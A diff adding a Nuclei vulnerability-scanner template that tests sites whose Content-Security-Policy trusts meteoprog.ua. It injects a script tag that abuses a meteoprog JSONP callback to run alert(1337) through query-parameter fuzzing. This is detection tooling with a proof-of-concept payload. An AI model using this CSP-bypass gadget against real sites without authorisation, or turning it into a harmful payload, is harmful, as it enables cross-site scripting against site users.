@@ -1,0 +1,55 @@
+id: meteoprog-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Meteoprog
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,meteoprog
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "meteoprog.ua"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: meteoprog_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://www.meteoprog.ua/data/weather/informer/Poltava.js?callback=alert(1337)"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "meteoprog_csp_xss == true"
+# digest: 4a0a004730450221009e582731d33d1e6b5cd0c5354cfefda0720fffe977886492d8f04f09561ed8f002202537c82e90b2e89a83f32d37edf1c1ea93c1c7bd1754d50d5bc72a20972e8870:922c64590222798bb761d5b6d8e72950
